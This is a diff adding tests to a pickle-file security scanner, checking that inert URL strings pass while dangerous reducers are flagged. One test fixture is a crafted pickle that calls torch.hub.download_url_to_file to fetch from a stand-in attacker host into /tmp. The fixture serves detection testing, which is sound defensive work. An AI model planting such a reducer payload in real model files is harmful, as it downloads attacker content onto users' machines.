@@ -18,6 +18,7 @@ from modelaudit.scanners import pickle_scanner
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.pickle_scanner import (
     _BINARY_TAIL_SCAN_BYTES,
+    _PICKLE_LITERAL_RECORD_MAX_OPCODES,
     ALWAYS_DANGEROUS_FUNCTIONS,
     ALWAYS_DANGEROUS_MODULES,
     PickleScanner,
@@ -25,6 +26,7 @@ from modelaudit.scanners.pickle_scanner import (
     _is_dangerous_module,
     _is_legitimate_serialization_file,
     _looks_like_pickle,
+    _pickle_literal_records,
     _pickle_opcode_summary,
     _rebuild_tensor_indicators_are_documentation_literals,
     is_suspicious_global,
@@ -1445,6 +1447,7 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() ->
             "license": "https://ultralytics.com/license",
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
             "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
+            "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
         protocol=0,
@@ -1454,6 +1457,17 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() ->
 
     assert result.success is True
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert not any(
+        issue.details.get("type") == "network_library" and issue.severity == IssueSeverity.CRITICAL
+        for issue in result.issues
+    )
+
+
+def test_pickle_literal_records_stops_before_unbounded_opcode_stream() -> None:
+    payload = b"N" * (_PICKLE_LITERAL_RECORD_MAX_OPCODES + 5)
+    payload += b"Vhttps://docs.example.invalid/reference/requests.get(url)\n."
+
+    assert _pickle_literal_records(payload) == ()
 
 
 def test_scan_stream_keeps_code_after_url_literal_actionable() -> None:
@@ -1554,6 +1568,35 @@ def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
         issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
         and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_allows_url_literal_in_safe_reducer_without_critical_s310() -> None:
+    payload = b"cbuiltins\nstr\n(Vhttps://ultralytics.com/license\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="safe-url-reducer.pkl")
+
+    assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_stream_keeps_torch_hub_download_url_reducer_actionable() -> None:
+    payload = b"ctorch.hub\ndownload_url_to_file\n(Vhttps://attacker.example/payload\nV/tmp/model.bin\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="torch-url-reducer.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "torch.hub.download_url_to_file"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
